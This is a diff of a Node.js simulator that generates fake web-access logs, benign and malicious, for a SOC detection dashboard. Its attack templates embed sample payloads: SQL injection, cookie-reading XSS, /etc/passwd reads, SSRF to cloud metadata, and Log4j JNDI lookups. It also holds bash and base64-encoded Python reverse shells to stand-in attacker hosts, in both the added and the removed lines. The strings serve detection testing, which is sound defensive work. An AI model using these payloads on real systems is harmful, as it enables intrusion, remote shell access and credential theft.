@@ -1,298 +1,476 @@
+/**
+ * Aapki Nazar - High-Performance Synthetic Traffic Simulator
+ * 
+ * Demonstrates controllable real-time SOC dashboard telemetry with:
+ * - Clean, curated in-memory HTTP templates (Zero multi-megabyte disk I/O).
+ * - Intuitive Events-Per-Second (EPS) rate control (1–10 EPS).
+ * - Calibrated Attack Intensity (0% = 100% benign, 100% = 100% malicious).
+ * - Dynamic runtime configuration updates without start/stop races.
+ * - Clear synthetic event attribution (SIMULATED, never masquerading as real CRS audit records).
+ * - Optional, strictly rate-limited demonstration incident creation (OFF by default).
+ * - Reserved documentation IP ranges (RFC 5737: 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24).
+ */
+
 const logAnalysisService = require("./logAnalysisService");
 const incidentService = require("./incidentService");
-const fs = require("fs");
-const path = require("path");
 
-let isRunning = false;
-let intervalId = null;
-let ioInstance = null;
-let logsGeneratedCount = 0;
-let threatsBlockedCount = 0;
-const recentIncidentsByIp = new Map();
-let lastIncidentCreationTime = 0;
+// ═══════════════════════════════════════════════════════════════════════
+// 1. CURATED TEMPLATE CATALOG (Zero External Dependencies)
+// ═══════════════════════════════════════════════════════════════════════
 
-let realBenignLogs = [];
-let cloudTrailLogs = [];
-let sqliPayloads = [];
-let xssPayloads = [];
-let lfiPayloads = [];
-let cmdiPayloads = [];
-let ssrfPayloads = [];
-let nosqliPayloads = [];
-let sstiPayloads = [];
-let xxePayloads = [];
-let ldapPayloads = [];
-let deserPayloads = [];
-let openredPayloads = [];
-let crlfPayloads = [];
-let jwtPayloads = [];
-let dirbrutePayloads = [];
+const BENIGN_IPS = [
+  "192.0.2.10",
+  "192.0.2.11",
+  "192.0.2.12",
+  "198.51.100.10",
+  "203.0.113.10"
+];
 
-try {
-  const load = (name) => fs.readFileSync(path.join(__dirname, "..", "data", `${name}_payloads.txt`), "utf-8").split('\n').filter(Boolean);
-  sqliPayloads = load("sqli");
-  xssPayloads = load("xss");
-  lfiPayloads = load("lfi");
-  cmdiPayloads = load("cmdi");
-  ssrfPayloads = load("ssrf");
-  nosqliPayloads = load("nosqli");
-  sstiPayloads = load("ssti");
-  xxePayloads = load("xxe");
-  ldapPayloads = load("ldap");
-  deserPayloads = load("deserialization");
-  openredPayloads = load("open_redirect");
-  crlfPayloads = load("crlf");
-  jwtPayloads = load("jwt");
-  dirbrutePayloads = load("directory_brute");
-  console.log(`[Chaos Engine] Loaded thousands of advanced enterprise payloads across 14 categories.`);
-} catch (err) {
-  console.log(`[Chaos Engine] Dynamic payloads not found. Falling back to static templates.`);
-  console.error(err);
-  sqliPayloads = ["1' OR '1'='1"]; xssPayloads = ["<script>alert(1)</script>"]; lfiPayloads = ["../../../../etc/passwd"]; cmdiPayloads = ["whoami"]; ssrfPayloads = ["http://169.254.169.254"]; nosqliPayloads = ["{$gt: ''}"]; sstiPayloads = ["{{7*7}}"]; xxePayloads = ["<!ENTITY xxe SYSTEM 'file:///etc/passwd'>"]; ldapPayloads = ["*(objectclass=*)"]; deserPayloads = ["rO0ABXNy"]; openredPayloads = ["//evil.com"]; crlfPayloads = ["%0D%0ASet-Cookie: session=hacked"]; jwtPayloads = ["eyJhbGciOiJub25l"]; dirbrutePayloads = ["/admin"];
-}
+const ATTACKER_IPS = [
+  "198.51.100.44",
+  "198.51.100.88",
+  "203.0.113.19",
+  "203.0.113.72",
+  "192.0.2.55"
+];
 
-const ATTACK_TEMPLATES = [
-  // SQLi
-  () => `198.51.100.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "GET /api/v1/users?${sqliPayloads[Math.floor(Math.random() * sqliPayloads.length)]} HTTP/1.1" 500 1024`,
-  () => `198.51.100.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "POST /auth/login HTTP/1.1" 200 450 - payload: {"username": "${sqliPayloads[Math.floor(Math.random() * sqliPayloads.length)].replace(/"/g, '\\"')}", "password": "password"}`,
+const CURATED_BENIGN_TEMPLATES = [
+  (ip, ts) => `${ip} - - [${ts}] "GET /api/v1/products?category=electronics&page=1 HTTP/1.1" 200 4200 "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"`,
+  (ip, ts) => `${ip} - - [${ts}] "GET /api/v1/dashboard HTTP/1.1" 200 1850 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"`,
+  (ip, ts) => `${ip} - - [${ts}] "GET /assets/main.css HTTP/1.1" 304 0 "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"`,
+  (ip, ts) => `${ip} - - [${ts}] "GET /api/health HTTP/1.1" 200 52 "HealthCheck/1.0"`,
+  (ip, ts) => `${ip} - - [${ts}] "GET /favicon.ico HTTP/1.1" 200 1150 "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)"`,
+  (ip, ts) => `${ip} - - [${ts}] "POST /api/v1/checkout HTTP/1.1" 200 850 - payload: {"cartId":"c-8921","items":2}`,
+  (ip, ts) => `${ip} - - [${ts}] "GET /search?q=laptop&sort=price HTTP/1.1" 200 3120 "Chrome/114.0.0.0"`,
+  (ip, ts) => `${ip} - - [${ts}] "GET /api/v1/user/profile HTTP/1.1" 200 640 "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"`
+];
+
+const CURATED_ATTACK_TEMPLATES = [
+  // SQL Injection (Union / Tautology)
+  (ip, ts) => `${ip} - - [${ts}] "GET /api/v1/users?search=' UNION SELECT null, username, password FROM users -- HTTP/1.1" 500 1024`,
+  (ip, ts) => `${ip} - - [${ts}] "POST /auth/login HTTP/1.1" 200 450 - payload: {"username": "admin' OR '1'='1 --", "password": "pwd"}`,
   
-  // Path Traversal / LFI
-  () => `45.33.32.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "GET /download?${lfiPayloads[Math.floor(Math.random() * lfiPayloads.length)]} HTTP/1.1" 403 240`,
-  
-  // XSS
-  () => `103.251.167.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "POST /comments/new HTTP/1.1" 201 540 - body: ${xssPayloads[Math.floor(Math.random() * xssPayloads.length)]}`,
-  () => `103.251.167.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "GET /search?term=${encodeURIComponent(xssPayloads[Math.floor(Math.random() * xssPayloads.length)])} HTTP/1.1" 200 320`,
+  // Cross-Site Scripting (XSS)
+  (ip, ts) => `${ip} - - [${ts}] "GET /search?q=<script>alert(document.cookie)</script> HTTP/1.1" 200 320`,
+  (ip, ts) => `${ip} - - [${ts}] "POST /comments HTTP/1.1" 201 540 - payload: {"comment": "<img src=x onerror=alert(1)>"}`,
   
   // Command Injection (CMDi)
-  () => `194.26.29.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "POST /api/ping HTTP/1.1" 200 890 - body: {"host": "127.0.0.1 ${cmdiPayloads[Math.floor(Math.random() * cmdiPayloads.length)]}"}`,
+  (ip, ts) => `${ip} - - [${ts}] "POST /api/ping HTTP/1.1" 200 890 - payload: {"host": "127.0.0.1; cat /etc/passwd"}`,
+  (ip, ts) => `${ip} - - [${ts}] "POST /api/exec HTTP/1.1" 200 890 - payload: {"cmd": "/bin/bash -i >& /dev/tcp/198.51.100.44/4242 0>&1"}`,
   
-  // SSRF
-  () => `104.18.22.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "POST /api/webhook HTTP/1.1" 200 300 - body: {"${ssrfPayloads[Math.floor(Math.random() * ssrfPayloads.length)]}"}`,
+  // Path Traversal / LFI
+  (ip, ts) => `${ip} - - [${ts}] "GET /download?file=../../../../etc/passwd HTTP/1.1" 403 240`,
   
-  // NoSQL Injection
-  () => `13.33.22.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "POST /api/users/find HTTP/1.1" 200 150 - body: {"${nosqliPayloads[Math.floor(Math.random() * nosqliPayloads.length)]}"}`,
+  // Server-Side Request Forgery (SSRF)
+  (ip, ts) => `${ip} - - [${ts}] "POST /api/webhook HTTP/1.1" 200 300 - payload: {"url": "http://169.254.169.254/latest/meta-data/"}`,
   
-  // SSTI
-  () => `18.22.44.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "GET /profile?name=${sstiPayloads[Math.floor(Math.random() * sstiPayloads.length)]} HTTP/1.1" 500 244`,
-  
-  // XXE
-  () => `44.55.66.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "POST /api/upload_xml HTTP/1.1" 500 310 - body: ${xxePayloads[Math.floor(Math.random() * xxePayloads.length)]}`,
-  
-  // LDAP Injection
-  () => `55.66.77.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "POST /api/auth/ldap HTTP/1.1" 401 122 - body: {"${ldapPayloads[Math.floor(Math.random() * ldapPayloads.length)]}"}`,
-  
-  // Insecure Deserialization
-  () => `66.77.88.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "POST /api/sync HTTP/1.1" 500 890 - body: {"${deserPayloads[Math.floor(Math.random() * deserPayloads.length)]}"}`,
-  
-  // Open Redirect
-  () => `77.88.99.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "GET /auth/callback?${openredPayloads[Math.floor(Math.random() * openredPayloads.length)]} HTTP/1.1" 302 0`,
-  
-  // CRLF
-  () => `88.99.100.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "GET /api/headers?${crlfPayloads[Math.floor(Math.random() * crlfPayloads.length)]} HTTP/1.1" 200 40`,
-  
-  // JWT Tampering
-  () => `99.100.111.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "GET /api/secure/data HTTP/1.1" 403 120 - header: ${jwtPayloads[Math.floor(Math.random() * jwtPayloads.length)]}`,
-  
-  // Directory Brute-Forcing
-  () => `111.122.133.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "GET ${dirbrutePayloads[Math.floor(Math.random() * dirbrutePayloads.length)]} HTTP/1.1" 404 150`,
-
-  // Log4j
-  () => `185.191.171.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "GET /login HTTP/1.1" 400 320 - User-Agent: \${jndi:ldap://log4j.attacker.io:1389/Exploit}`,
-  
-  // High Entropy Obfuscation
-  () => `203.0.113.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "POST /upload HTTP/1.1" 200 4096 - payload: eval(base64_decode('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjAuMC4xIiw0MjQyKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0p'))`,
-  
-  // Brute Force Burst
-  () => `192.0.2.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "POST /api/v2/auth/token HTTP/1.1" 401 120 - Failed password for user root (attempt #${Math.floor(Math.random() * 50) + 1})`
+  // Log4j / JNDI
+  (ip, ts) => `${ip} - - [${ts}] "GET /login HTTP/1.1" 400 320 - User-Agent: \${jndi:ldap://attacker.com/exploit}`
 ];
 
-const BENIGN_TEMPLATES = [
-  () => `172.56.21.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "GET /api/v1/dashboard HTTP/1.1" 200 3420 "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"`,
-  () => `172.56.21.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "GET /assets/main.css HTTP/1.1" 304 0 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"`,
-  () => `172.56.21.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "GET /api/health HTTP/1.1" 200 42 "HealthCheck-Monitor/1.0"`,
-  () => `10.0.0.15 - - [${new Date().toISOString()}] "GET /favicon.ico HTTP/1.1" 200 1150 "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)"`,
-  () => `172.56.21.${Math.floor(Math.random() * 250) + 1} - - [${new Date().toISOString()}] "POST /api/v1/checkout HTTP/1.1" 200 850 "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"`,
-  () => `10.0.0.120 - - [${new Date().toISOString()}] "GET /api/products?category=electronics&page=1 HTTP/1.1" 200 4500 "Chrome/114.0.0.0"`
-];
+// ═══════════════════════════════════════════════════════════════════════
+// 2. SIMULATOR SERVICE CLASS
+// ═══════════════════════════════════════════════════════════════════════
 
-try {
-  const dataPath = path.join(__dirname, "..", "data", "access_sampled.log");
-  const data = fs.readFileSync(dataPath, "utf-8");
-  realBenignLogs = data.split('\n').filter(line => line.trim().length > 0);
-  console.log(`[Chaos Engine] Successfully loaded ${realBenignLogs.length} real web logs from access_sampled.log`);
-} catch (err) {
-  console.log(`[Chaos Engine] Dataset access_sampled.log not found. Falling back to static web templates.`);
-}
+class SimulatorService {
+  constructor() {
+    this.isRunning = false;
+    this.timerHandle = null;
+    this.ioInstance = null;
 
-try {
-  const cloudPath = path.join(__dirname, "..", "data", "cloudtrail_sampled.csv");
-  const data = fs.readFileSync(cloudPath, "utf-8");
-  // Skip header and empty lines
-  cloudTrailLogs = data.split('\n').slice(1).filter(line => line.trim().length > 0);
-  console.log(`[Chaos Engine] Successfully loaded ${cloudTrailLogs.length} CloudTrail logs from cloudtrail_sampled.csv`);
-} catch (err) {
-  console.log(`[Chaos Engine] Dataset cloudtrail_sampled.csv not found. No cloud logs will be simulated.`);
-}
+    // Authoritative persisted configuration
+    this.config = {
+      eps: 2,                 // Events per second (1 to 10)
+      attackIntensity: 0.35,  // 0.0 to 1.0 (proportion of attacks)
+      createIncidents: false  // Explicit opt-in demonstration toggle (OFF by default)
+    };
 
-let splunkLogs = [];
-try {
-  const splunkPath = path.join(__dirname, "..", "data", "botsv3_sampled.log");
-  const data = fs.readFileSync(splunkPath, "utf-8");
-  splunkLogs = data.split('\n').filter(line => line.trim().length > 0);
-  console.log(`[Chaos Engine] Successfully loaded ${splunkLogs.length} Splunk BOTS v3 logs`);
-} catch (err) {
-  console.log(`[Chaos Engine] Dataset botsv3_sampled.log not found. Skipping Splunk integration.`);
-}
+    // Authoritative event counters
+    this.stats = {
+      totalGenerated: 0,
+      benignCount: 0,
+      maliciousCount: 0,
+      detectedCount: 0,
+      incidentsCreatedCount: 0
+    };
 
-function generateSingleLog(attackRatio = 0.35) {
-  const isAttack = Math.random() < attackRatio; 
-  let rawLog = "";
-  if (isAttack) {
-    const template = ATTACK_TEMPLATES[Math.floor(Math.random() * ATTACK_TEMPLATES.length)];
-    rawLog = template();
-  } else {
-    // 50% chance Nginx, 30% chance CloudTrail, 20% chance Splunk BOTS (if available)
-    const rng = Math.random();
-    if (rng < 0.20 && splunkLogs.length > 0) {
-        rawLog = splunkLogs[Math.floor(Math.random() * splunkLogs.length)];
-    } else if (rng < 0.50 && cloudTrailLogs.length > 0) {
-        rawLog = cloudTrailLogs[Math.floor(Math.random() * cloudTrailLogs.length)];
-    } else if (realBenignLogs.length > 0) {
-        rawLog = realBenignLogs[Math.floor(Math.random() * realBenignLogs.length)];
-    } else {
-        const template = BENIGN_TEMPLATES[Math.floor(Math.random() * BENIGN_TEMPLATES.length)];
-        rawLog = template();
-    }
+    this.sessionId = `SIM-${Date.now()}`;
+    this.recentIncidentsByIp = new Map();
+    this.lastIncidentCreationTime = 0;
+    this.incidentThrottleMs = 3000; // Strict rate-limit: at most 1 simulated incident per 3s
+
+    // Sliding window for actual EPS measurement
+    this.recentEventTimestamps = [];
   }
 
-  logsGeneratedCount++;
-  const analysis = logAnalysisService.detectThreat(rawLog);
-
-  if (analysis.status === "threat_detected") {
-    threatsBlockedCount++;
+  setIo(io) {
+    this.ioInstance = io;
   }
 
-  return {
-    rawLog,
-    analysis,
-    timestamp: new Date().toISOString()
-  };
-}
+  /**
+   * Safe input validation and clamping
+   */
+  validateConfig(input = {}) {
+    let eps = this.config.eps;
+    let attackIntensity = this.config.attackIntensity;
+    let createIncidents = this.config.createIncidents;
 
-function startSimulator(io, intervalMs = 1500, attackRatio = 0.35) {
-  if (isRunning) return { isRunning: true, message: "Simulator is already running" };
-  isRunning = true;
-  ioInstance = io;
-
-  intervalId = setInterval(async () => {
-    try {
-      const sample = generateSingleLog(attackRatio);
-
-      // Emit telemetry stream event to all connected clients
-      if (ioInstance) {
-        ioInstance.emit("telemetry_stream", {
-          raw: sample.rawLog,
-          timestamp: sample.timestamp,
-          isThreat: sample.analysis.status === "threat_detected",
-          threatType: sample.analysis.type,
-          threatScore: sample.analysis.threatScore || 0,
-          severity: sample.analysis.severity,
-          sourceIp: sample.analysis.normalizedLog?.sourceIp,
-          geo: sample.analysis.normalizedLog?.geo,
-          stats: {
-            totalGenerated: logsGeneratedCount,
-            threatsBlocked: threatsBlockedCount
-          }
-        });
+    if (input.eps !== undefined) {
+      const parsedEps = parseFloat(input.eps);
+      if (!isNaN(parsedEps)) {
+        eps = Math.max(1, Math.min(10, Math.round(parsedEps)));
       }
+    } else if (input.interval !== undefined) {
+      // Legacy intervalMs mapping (3000ms -> 1 EPS, 100ms -> 10 EPS)
+      const parsedInterval = parseInt(input.interval, 10);
+      if (!isNaN(parsedInterval) && parsedInterval > 0) {
+        eps = Math.max(1, Math.min(10, Math.round(1000 / parsedInterval)));
+      }
+    }
 
-      // If threat is HIGH or CRITICAL, apply a deterministic threshold to prevent database alert storms.
-      // We allow all correlated events to pass, but strictly rate-limit NEW incident generation to 1 per 2.5 seconds globally.
-      if (sample.analysis.status === "threat_detected" && (sample.analysis.severity === "HIGH" || sample.analysis.severity === "CRITICAL")) {
-        const sourceIp = sample.analysis.normalizedLog?.sourceIp || "unknown";
-        let correlatedId = sourceIp !== "unknown" ? recentIncidentsByIp.get(sourceIp) : null;
-        const nowMs = Date.now();
+    if (input.attackIntensity !== undefined) {
+      const parsedIntensity = parseFloat(input.attackIntensity);
+      if (!isNaN(parsedIntensity)) {
+        attackIntensity = Math.max(0.0, Math.min(1.0, Math.round(parsedIntensity * 100) / 100));
+      }
+    } else if (input.attackRatio !== undefined) {
+      const parsedRatio = parseFloat(input.attackRatio);
+      if (!isNaN(parsedRatio)) {
+        attackIntensity = Math.max(0.0, Math.min(1.0, Math.round(parsedRatio * 100) / 100));
+      }
+    }
 
-        if (true) {
-          if (correlatedId) {
-              try {
-                await incidentService.addComment(correlatedId, {
-                  note: `[CORRELATION] Repeated simulated attack blocked from this IP. Threat: ${sample.analysis.type}. Score: ${sample.analysis.threatScore}`,
-                  author: "Chaos-Engine"
-                });
-                if (ioInstance) ioInstance.emit("incident_updated", { incidentId: correlatedId });
-              } catch (e) {
-                recentIncidentsByIp.delete(sourceIp);
-                correlatedId = null;
-              }
-            }
+    if (input.createIncidents !== undefined) {
+      createIncidents = !!input.createIncidents;
+    }
 
-          if (!correlatedId) {
-            const autoInc = await incidentService.createIncident({
-              title: `[Live Threat] ${sample.analysis.type}`,
-              severity: sample.analysis.severity,
-              status: "OPEN",
-              assignedTo: "SOC-Engine",
-              description: `Interception of live simulated attack from source ${sourceIp}. Threat Score: ${sample.analysis.threatScore}/100. Payload: ${sample.rawLog.slice(0, 150)}...`,
-              playbook: sample.analysis.playbook,
-              payload: sample.analysis.forensicPackage,
-              confidence: sample.analysis.confidence,
-              threatType: sample.analysis.type,
-              mitreTechnique: JSON.stringify(sample.analysis.mitre)
-            });
+    return { eps, attackIntensity, createIncidents };
+  }
 
-            if (sourceIp !== "unknown") {
-              recentIncidentsByIp.set(sourceIp, autoInc.incidentId);
-              setTimeout(() => recentIncidentsByIp.delete(sourceIp), 15 * 60 * 1000);
-            }
+  /**
+   * Start simulator (Idempotent)
+   */
+  startSimulator(io = null, initialConfig = {}) {
+    if (io) this.ioInstance = io;
 
-            if (ioInstance) {
-              ioInstance.emit("incident_created", autoInc);
-              ioInstance.emit("dashboard_update_needed");
-            }
-            lastIncidentCreationTime = nowMs;
-          }
+    if (Object.keys(initialConfig).length > 0) {
+      this.config = this.validateConfig(initialConfig);
+    }
+
+    if (this.isRunning) {
+      return {
+        isRunning: true,
+        message: "Simulator is already running",
+        config: this.config,
+        stats: this.stats,
+        sessionId: this.sessionId
+      };
+    }
+
+    this.isRunning = true;
+    this.sessionId = `SIM-${Date.now()}`;
+    this.recentIncidentsByIp.clear();
+
+    // Broadcast authoritative state change
+    this.broadcastState();
+
+    // Launch scheduler
+    this.scheduleNextTick();
+
+    return {
+      isRunning: true,
+      message: "Synthetic Traffic Simulator started",
+      config: this.config,
+      stats: this.stats,
+      sessionId: this.sessionId
+    };
+  }
+
+  /**
+   * Stop simulator (Idempotent)
+   */
+  stopSimulator() {
+    if (!this.isRunning) {
+      return {
+        isRunning: false,
+        message: "Simulator is not running",
+        config: this.config,
+        stats: this.stats,
+        sessionId: this.sessionId
+      };
+    }
+
+    if (this.timerHandle) {
+      clearTimeout(this.timerHandle);
+      this.timerHandle = null;
+    }
+
+    this.isRunning = false;
+
+    // Broadcast authoritative state change
+    this.broadcastState();
+
+    return {
+      isRunning: false,
+      message: "Synthetic Traffic Simulator stopped",
+      config: this.config,
+      stats: this.stats,
+      sessionId: this.sessionId
+    };
+  }
+
+  /**
+   * Live configuration update without stop/start races
+   */
+  updateConfig(newConfig = {}) {
+    const updated = this.validateConfig(newConfig);
+    const epsChanged = updated.eps !== this.config.eps;
+
+    this.config = updated;
+
+    // If running and EPS changed, reschedule immediately
+    if (this.isRunning && epsChanged) {
+      if (this.timerHandle) clearTimeout(this.timerHandle);
+      this.scheduleNextTick();
+    }
+
+    this.broadcastState();
+
+    return {
+      success: true,
+      isRunning: this.isRunning,
+      config: this.config,
+      stats: this.stats
+    };
+  }
+
+  /**
+   * Self-scheduling tick loop (prevents overlapping callbacks)
+   */
+  scheduleNextTick() {
+    if (!this.isRunning) return;
+
+    const delayMs = Math.max(50, Math.round(1000 / this.config.eps));
+
+    this.timerHandle = setTimeout(async () => {
+      if (!this.isRunning) return;
+      try {
+        await this.generateAndEmitLog();
+      } catch (err) {
+        console.error("[SIMULATOR] Error in generation tick:", err.message);
+      } finally {
+        if (this.isRunning) {
+          this.scheduleNextTick();
         }
       }
-    } catch (err) {
-      console.error("Error in simulator loop:", err);
-    }
-  }, intervalMs);
-
-  return { isRunning: true, message: "Chaos Engine Traffic Simulator started" };
-}
-
-function stopSimulator() {
-  if (!isRunning) return { isRunning: false, message: "Simulator is not running" };
-  clearInterval(intervalId);
-  isRunning = false;
-  intervalId = null;
-
-  if (ioInstance) {
-    ioInstance.emit("simulator_state_changed", { isRunning: false });
+    }, delayMs);
   }
 
-  return { isRunning: false, message: "Chaos Engine Traffic Simulator stopped" };
+  /**
+   * Generate a single synthetic event and broadcast to telemetry stream
+   */
+  async generateAndEmitLog() {
+    const now = Date.now();
+    const isoTime = new Date(now).toISOString();
+
+    // Track for actual measured EPS
+    this.recentEventTimestamps.push(now);
+    if (this.recentEventTimestamps.length > 50) {
+      this.recentEventTimestamps = this.recentEventTimestamps.filter(t => now - t <= 2000);
+    }
+
+    const isMalicious = Math.random() < this.config.attackIntensity;
+    let rawLog = "";
+    let sourceIp = "127.0.0.1";
+
+    if (isMalicious) {
+      sourceIp = ATTACKER_IPS[Math.floor(Math.random() * ATTACKER_IPS.length)];
+      const template = CURATED_ATTACK_TEMPLATES[Math.floor(Math.random() * CURATED_ATTACK_TEMPLATES.length)];
+      rawLog = template(sourceIp, isoTime);
+      this.stats.maliciousCount++;
+    } else {
+      sourceIp = BENIGN_IPS[Math.floor(Math.random() * BENIGN_IPS.length)];
+      const template = CURATED_BENIGN_TEMPLATES[Math.floor(Math.random() * CURATED_BENIGN_TEMPLATES.length)];
+      rawLog = template(sourceIp, isoTime);
+      this.stats.benignCount++;
+    }
+
+    this.stats.totalGenerated++;
+
+    // Custom sensor analysis (never claiming official ModSec blocking)
+    const analysis = logAnalysisService.detectThreat(rawLog);
+    const isThreat = analysis.status === "threat_detected";
+
+    if (isThreat) {
+      this.stats.detectedCount++;
+    }
+
+    const telemetryPayload = {
+      id: `sim-${now}-${Math.floor(Math.random() * 10000)}`,
+      timestamp: isoTime,
+      raw: rawLog,
+      isSimulated: true,
+      action: isThreat ? "DETECTED" : "ALLOWED",
+      statusCode: isThreat ? 403 : 200,
+      isThreat,
+      threatType: isThreat ? analysis.type : "Normal Web Traffic",
+      threatScore: analysis.threatScore || 0,
+      severity: isThreat ? analysis.severity : "CLEAN",
+      sourceIp,
+      geo: analysis.normalizedLog?.geo,
+      sensor: "SYNTHETIC-SIMULATOR",
+      sessionId: this.sessionId,
+      stats: {
+        totalGenerated: this.stats.totalGenerated,
+        benignCount: this.stats.benignCount,
+        maliciousCount: this.stats.maliciousCount,
+        detectedCount: this.stats.detectedCount
+      }
+    };
+
+    // Emit live telemetry stream to connected Socket.IO clients
+    if (this.ioInstance) {
+      this.ioInstance.emit("telemetry_stream", telemetryPayload);
+    }
+
+    // Optional: Demonstration Incident Creation (strictly throttled & off by default)
+    if (this.config.createIncidents && isThreat && (analysis.severity === "HIGH" || analysis.severity === "CRITICAL")) {
+      await this.handleDemonstrationIncident(analysis, sourceIp, rawLog, now);
+    }
+
+    return telemetryPayload;
+  }
+
+  /**
+   * Controlled simulated incident handler with strict throttling and deduplication
+   */
+  async handleDemonstrationIncident(analysis, sourceIp, rawLog, nowMs) {
+    if (nowMs - this.lastIncidentCreationTime < this.incidentThrottleMs) {
+      return; // Respect 3-second global incident throttle
+    }
+
+    let correlatedId = this.recentIncidentsByIp.get(sourceIp);
+
+    if (correlatedId) {
+      try {
+        await incidentService.addComment(correlatedId, {
+          note: `[SIMULATED CORRELATION] Repeated synthetic attack from simulated IP ${sourceIp}. Type: ${analysis.type}. Score: ${analysis.threatScore}/100.`,
+          author: "Simulator"
+        });
+        if (this.ioInstance) this.ioInstance.emit("incident_updated", { incidentId: correlatedId });
+        this.lastIncidentCreationTime = nowMs;
+        return;
+      } catch (e) {
+        this.recentIncidentsByIp.delete(sourceIp);
+        correlatedId = null;
+      }
+    }
+
+    if (!correlatedId) {
+      try {
+        const autoInc = await incidentService.createIncident({
+          title: `[Simulated Threat] ${analysis.type}`,
+          severity: analysis.severity,
+          status: "OPEN",
+          assignedTo: "Simulator",
+          description: `[SIMULATED] Demonstration event generated by Synthetic Traffic Simulator (Session: ${this.sessionId}). Threat: ${analysis.type}. Score: ${analysis.threatScore}/100. Payload: ${rawLog.slice(0, 160)}...`,
+          playbook: analysis.playbook,
+          payload: analysis.forensicPackage,
+          confidence: "SIMULATED (Synthetic Traffic Engine)",
+          threatType: analysis.type,
+          mitreTechnique: JSON.stringify(analysis.mitre),
+          eventSource: "SIMULATED"
+        });
+
+        this.stats.incidentsCreatedCount++;
+        this.recentIncidentsByIp.set(sourceIp, autoInc.incidentId);
+        const cleanupTimer = setTimeout(() => this.recentIncidentsByIp.delete(sourceIp), 15 * 60 * 1000);
+        if (cleanupTimer && cleanupTimer.unref) cleanupTimer.unref();
+
+        if (this.ioInstance) {
+          this.ioInstance.emit("incident_created", autoInc);
+          this.ioInstance.emit("dashboard_update_needed");
+        }
+
+        this.lastIncidentCreationTime = nowMs;
+      } catch (err) {
+        console.error("[SIMULATOR] Error creating simulated demonstration incident:", err.message);
+      }
+    }
+  }
+
+  /**
+   * Calculate actual measured EPS over bounded 2-second observation window
+   */
+  getMeasuredEps() {
+    if (!this.isRunning) return 0;
+    const now = Date.now();
+    const count = this.recentEventTimestamps.filter(t => now - t <= 2000).length;
+    return Number((count / 2).toFixed(1));
+  }
+
+  /**
+   * Broadcast authoritative state via Socket.IO
+   */
+  broadcastState() {
+    if (this.ioInstance) {
+      this.ioInstance.emit("simulator_state_changed", this.getStatus());
+    }
+  }
+
+  /**
+   * Return full authoritative simulator status
+   */
+  getStatus() {
+    return {
+      isRunning: this.isRunning,
+      config: { ...this.config },
+      stats: {
+        totalGenerated: this.stats.totalGenerated,
+        benignCount: this.stats.benignCount,
+        maliciousCount: this.stats.maliciousCount,
+        detectedCount: this.stats.detectedCount,
+        incidentsCreatedCount: this.stats.incidentsCreatedCount,
+        // Legacy compatibility aliases
+        totalEvents: this.stats.totalGenerated,
+        threatsBlocked: this.stats.detectedCount
+      },
+      currentEps: this.getMeasuredEps(),
+      sessionId: this.sessionId
+    };
+  }
+
+  /**
+   * Reset stats counters
+   */
+  resetCounters() {
+    this.stats = {
+      totalGenerated: 0,
+      benignCount: 0,
+      maliciousCount: 0,
+      detectedCount: 0,
+      incidentsCreatedCount: 0
+    };
+    this.recentEventTimestamps = [];
+    this.recentIncidentsByIp.clear();
+    this.broadcastState();
+  }
 }
 
-function getStatus() {
-  return {
-    isRunning,
-    logsGeneratedCount,
-    threatsBlockedCount
-  };
-}
+// Singleton instance
+const instance = new SimulatorService();
 
-function resetCounters() {
-  logsGeneratedCount = 0;
-  threatsBlockedCount = 0;
-  recentIncidentsByIp.clear();
-}
-
+// Export class instance methods with legacy binding
 module.exports = {
-  startSimulator,
-  stopSimulator,
-  getStatus,
-  generateSingleLog,
-  resetCounters
+  startSimulator: (io, initialConfig) => instance.startSimulator(io, initialConfig),
+  stopSimulator: () => instance.stopSimulator(),
+  updateConfig: (newConfig) => instance.updateConfig(newConfig),
+  getStatus: () => instance.getStatus(),
+  resetCounters: () => instance.resetCounters(),
+  generateSingleLog: (attackRatio) => {
+    instance.config.attackIntensity = attackRatio !== undefined ? attackRatio : instance.config.attackIntensity;
+    return instance.generateAndEmitLog();
+  },
+  setIo: (io) => instance.setIo(io),
+  SimulatorService // Export class for isolated testing
